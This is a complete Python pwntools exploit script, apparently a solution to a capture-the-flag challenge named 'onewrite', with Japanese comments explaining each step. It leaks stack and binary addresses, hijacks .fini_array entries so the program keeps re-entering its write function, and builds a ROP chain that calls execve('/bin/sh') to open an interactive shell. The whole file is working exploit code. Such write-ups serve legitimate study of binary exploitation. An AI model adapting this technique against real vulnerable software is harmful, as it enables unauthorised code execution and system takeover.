#!/usr/bin/env python3

from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./onewrite")
#gdb.attach(target, gdbscript="b do_overwrite")
elf = ELF("onewrite")

def leak(selection):
    target.recvuntil("> ")
    target.sendline(str(selection))
    leak = int( target.recvline().decode("utf-8").strip("\n"), 16 )
    return leak

def write(address, content):
    target.recvuntil(":")
    target.send(str(address))
    target.recvuntil(":")
    target.send(content)

def write_rop(address, rop):
    global libc_fini
    global fini
    write(address, p64(rop))
    write(libc_fini, p64(fini))
    libc_fini += 8


stack_leak = leak(1)
print("stack leak is", hex(stack_leak))

write(stack_leak + 0x18, p8(0x04))

do_leak = leak(2)
print("do_leak address is ", hex(do_leak))

"""
info fileより
0x00007f275474ffb0 - 0x00007f275474ffc0 is .fini_array

gef➤  x/4x 0x00007f275474ffb0
0x7f275474ffb0: 0x544aa950      0x00007f27      0x544aa3b0      0x00007f27
gef➤  x/x 0x7f27544aa950
0x7f27544aa950 <__do_global_dtors_aux>: 0xa9a93d80
gef➤  x/x 0x7f27544aa3b0
0x7f27544aa3b0 <fini>:  0x18ec8348
"""

base = do_leak - elf.symbols["do_leak"]
fini = base + elf.symbols["__libc_csu_fini"]
aux  = base + elf.symbols["__do_global_dtors_aux_fini_array_entry"]
do_overwrite = base + elf.symbols["do_overwrite"]

print("base address is    ", hex(base))
print("fini address is    ", hex(fini))
print("aux  address is    ", hex(aux))
print("do_overwrite is    ", hex(do_overwrite))

write(stack_leak + 0x18, p8(0x04))
leak(1)

log.info("1,まずexit関数で呼ばれるfini_arrayの位置にdo_writeを書き込む")
write(aux + 8, p64(do_overwrite))
log.info("part1 done\n")
log.info("2,関数から呼ばれたoverwriteを使って次に呼ばれる位置に同じく書き込む")
write(aux, p64(do_overwrite))
log.info("part2, done\n")

"""
__finiからrun_exit_handlerを呼び出す位置にlibc_finiを書き込む
libc_finiはfini_arrayを読み込むので,arrayに書き込んだdo_writeが呼ばれる
"""
libc_fini = stack_leak - 72
log.info("3,_finiがretで呼び出す位置にlibc_finiを書き込む")
write(libc_fini, p64(fini))
log.info("part3, done")

#ループのたびにずれていくので呼び出すたびに+8する
libc_fini += 8

pop_rdi = base + 0x84fa
pop_rsi = base + 0xd9f2
pop_rdx = base + 0x484c5
pop_rax = base + 0x460ac
syscall = base + 0x917c
binsh   = do_leak + 0x2aa99b
pivot   = base + 0x1032b

log.info("4,ROPを書き込んでいく")
write_rop(binsh, 0x0068732f6e69622f)
write_rop(stack_leak + 0xd0, pop_rdi)
write_rop(stack_leak + 0xd8, binsh)
write_rop(stack_leak + 0xe0, pop_rsi)
write_rop(stack_leak + 0xe8, 0)
write_rop(stack_leak + 0xf0, pop_rdx)
write_rop(stack_leak + 0xf8, 0)
write_rop(stack_leak + 0x100, pop_rax)
write_rop(stack_leak + 0x108, 59)
write_rop(stack_leak + 0x110, syscall)

log.info("5,最後にスタックを引き延ばす")
write(stack_leak - 0x10, p64(pivot))

target.interactive()